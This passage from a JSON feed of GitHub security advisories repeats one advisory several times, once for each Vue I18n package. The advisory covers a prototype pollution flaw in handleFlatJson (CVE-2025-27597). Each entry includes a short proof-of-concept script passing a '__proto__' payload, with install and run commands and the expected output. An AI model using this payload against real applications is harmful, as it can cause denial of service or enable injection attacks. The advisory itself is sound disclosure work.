href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/core] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[@intlify/core-base] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\"># v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53\">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a\">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e\">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v10.0.6\">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v11.1.2\">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/releases/tag/v9.14.3\">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27597\">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>\n<li><a href=\"https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a\">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2ph-7g93-hw3m\">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m",
            "title": "[vue-i18n] Vue I18n Allows Prototype Pollution in `handleFlatJson`",
            "date_modified": "2025-03-10T19:17:59.000Z",
            "date_published": "2025-03-07T15:58:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2ph-7g93-hw3m"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}